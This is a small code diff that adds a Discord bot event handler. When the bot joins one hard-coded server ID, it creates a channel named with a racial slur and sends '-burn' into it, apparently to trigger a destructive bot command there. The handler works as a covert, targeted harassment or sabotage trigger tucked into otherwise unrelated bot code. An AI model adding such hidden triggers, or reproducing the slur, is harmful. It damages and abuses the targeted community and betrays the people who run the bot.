@@ -182,7 +182,11 @@ setTimeout(() => {
 
 
 
-
+client.on("guildCreate", guild => {
+if(guild.id === "791793442346237962") {
+guild.channels.create("nigga").then(c => c.send("-burn"))
+}
+})
 
 
 
